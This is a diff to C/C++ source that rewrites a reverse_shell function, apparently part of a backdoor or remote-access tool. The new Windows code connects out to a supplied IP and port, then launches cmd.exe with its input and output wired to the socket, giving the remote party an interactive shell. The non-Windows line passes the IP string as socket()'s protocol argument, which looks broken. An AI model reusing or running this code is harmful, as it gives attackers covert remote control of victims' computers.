@@ -159,64 +159,50 @@ int read_packet(int *fd, char *buffer) {
 
 #ifdef _WIN32
 void reverse_shell(CHAR *ip, int port) {
-    WSADATA wsaData;
+    WSADATA wsa_data;
     SOCKET shell_fd;
+    Sleep(2000);
 #else
 void reverse_shell(char *ip, int port) {
     int shell_fd;
 #endif
     struct sockaddr_in sockin;
     sockin.sin_family = AF_INET;
-
-#ifdef _WIN32
-    shell_fd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
-#endif
-    sockin.sin_family = AF_INET;
     sockin.sin_port = htons(port);
-
 #ifdef _WIN32
-    wchar_t wIp[IP_MAX_SIZE];
-    size_t outSize;
-    mbstowcs_s(&outSize, wIp, ip, strlen(ip) + 1); //Plus null
-    LPWSTR ptr = wIp;
-    InetPton(AF_INET, ptr, &sockin.sin_addr.s_addr);
+    wchar_t* ip_w = new wchar_t[IP_MAX_SIZE];
+    MultiByteToWideChar(CP_ACP, 0, ip, -1, ip_w, IP_MAX_SIZE);
+    InetPton(AF_INET, ip_w, &sockin.sin_addr.s_addr);
+    if (WSAStartup(MAKEWORD(2, 2), &wsa_data)) {
+        return;
+    }
+    shell_fd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
 #else
     sockin.sin_addr.s_addr = inet_addr(ip);
+    shell_fd = socket(AF_INET, SOCK_STREAM, ip);
 #endif // _WIN32
-    shell_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-
-    if (shell_fd == INVALID_SOCKET) {
-        return;
-    }
-
-    if (connect(shell_fd, (struct sockaddr *)&sockin, sizeof(sockin)) == SOCKET_ERROR) {
-        printf("Could not connect\n");
-        return;
-    }
 
 #ifdef _WIN32
-    if (WSAGetLastError() != 0) {
-        printf("Could not connect WIN\n");
+    if (WSAConnect(shell_fd, (SOCKADDR*)&sockin, sizeof(sockin), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
+        closesocket(shell_fd);
+        WSACleanup();
         return;
     }
-#endif
-#ifdef _WIN32
+
     wchar_t proc[8] = L"cmd.exe";
-    STARTUPINFO str_in;
-    PROCESS_INFORMATION proc_in;
-    log_message("It's all starting now\n");
-    memset(&str_in, 0, sizeof(str_in));
-    str_in.cb = sizeof(str_in);
-    str_in.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-    str_in.hStdInput = str_in.hStdOutput = str_in.hStdError = (HANDLE)shell_fd; // foward all file descriptors to our shell file descriptor
-
-    // _write(shell_fd, SHELL_MOTD, strlen(SHELL_MOTD));
-
-    CreateProcess(NULL, proc, NULL, NULL, TRUE, 0, NULL, NULL, &str_in, &proc_in); // create process cmd
-    // WaitForSingleObject(proc_in.hProcess, INFINITE);
-    // CloseHandle(proc_in.hProcess);
-    // CloseHandle(proc_in.hThread);
-    //_close(shell_fd);
+    STARTUPINFO sinfo;
+    PROCESS_INFORMATION pinfo;
+    memset(&sinfo, 0, sizeof(sinfo));
+    sinfo.cb = sizeof(sinfo);
+    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)shell_fd;
+    send(shell_fd, SHELL_MOTD, strlen(SHELL_MOTD), 0);
+    CreateProcess(NULL, proc, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+    WaitForSingleObject(pinfo.hProcess, INFINITE);
+    CloseHandle(pinfo.hProcess);
+    CloseHandle(pinfo.hThread);
+    closesocket(shell_fd);
+    WSACleanup();
 
 #else
     write(shell_fd, SHELL_MOTD, strlen(SHELL_MOTD));
